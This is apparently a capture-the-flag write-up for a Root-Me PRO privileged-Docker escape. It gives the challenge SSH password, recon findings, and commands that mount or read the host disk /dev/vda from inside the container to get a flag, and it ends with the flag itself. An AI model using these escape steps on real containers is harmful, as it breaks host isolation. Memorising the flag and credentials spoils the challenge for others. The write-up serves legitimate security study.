# Docker - Privileged (Root-Me PRO, System, Easy, 200pts)

Subtitle: `--give-me-privileges`
Vuln tag: Docker - Container Escape

## Access
ssh -p 32231 root@sockets.challenges.root-me.pro
Password: bOJEL#KPya5^e6NE$BDY@Znw1
(Public endpoint — no VPN required)

Flag format: RM{...}

## Recon (in container)
- Alpine 3.19.9, hostname `rmp`, uid 0
- capsh: `Current: =ep` — full effective capability set (cap_sys_admin, cap_mknod,
  cap_sys_module, cap_sys_rawio, etc, 41 caps total) -> confirmed privileged container
- Seccomp: 0 (no filter), AppArmor: unconfined
- cgroup v2 only -> classic release_agent (cgroup v1) escape not available
- `/dev/vda` present in container = host's raw root disk exposed (13GB block dev,
  group `disk`, rw for root) — privileged containers get real host device nodes
- `fdisk -l /dev/vda` shows a bogus/corrupt MBR (weird CHS, HPFS/NTFS, "not in disk
  order") — red herring, ignore
- `blkid /dev/vda` -> TYPE="ext4" LABEL="/" directly on the whole disk (no real
  partitions) — this IS the host's root filesystem

## Escape
- `mount -o ro /dev/vda /mnt/host` -> **"Resource busy"**
  ext4 opens the bdev exclusively; host already has it mounted rw,noatime elsewhere
  in its own mount ns, and a second mount with *different* options is rejected.
- Two ways around it (both work):
  1. `mount -o rw,noatime /dev/vda /mnt/host` — matching the host's exact mount
     options lets the kernel reuse the existing superblock -> mounts cleanly.
  2. `apk add e2fsprogs-extra` then `debugfs -R "ls -l /" /dev/vda` /
     `debugfs -R "cat /flag.txt" /dev/vda` — reads the raw ext4 image directly,
     no mount needed at all, sidesteps the busy-device issue entirely.
- `/flag.txt` sits right at the host filesystem root.

## Proof it's really the host, not the container's own overlay
| | container | mounted host fs |
|---|---|---|
| hostname | rmp | alpine |
| Alpine version | 3.19.9 | 3.22.2 |
host `/root` contains `.ansible/`, `.docker/`, `.ssh/` — clearly a provisioned VM host, not the CTF container image.

## Infra notes
- Endpoint `sockets.challenges.root-me.pro:32231` resets the TCP/SSH connection
  intermittently ("Error reading SSH protocol banner ... Connection reset by peer"),
  roughly 1 in 3 connect attempts. Workaround: retry with backoff, and batch
  multiple commands into one SSH session (`shell.py`) rather than reconnecting
  per command (`rc.py`) to reduce how often you hit the reset.
- No VPN required (challenge listed as Public).

## Flag
RM{d33f94de38a6be23b4d4908edfc7bee4db8621b5}
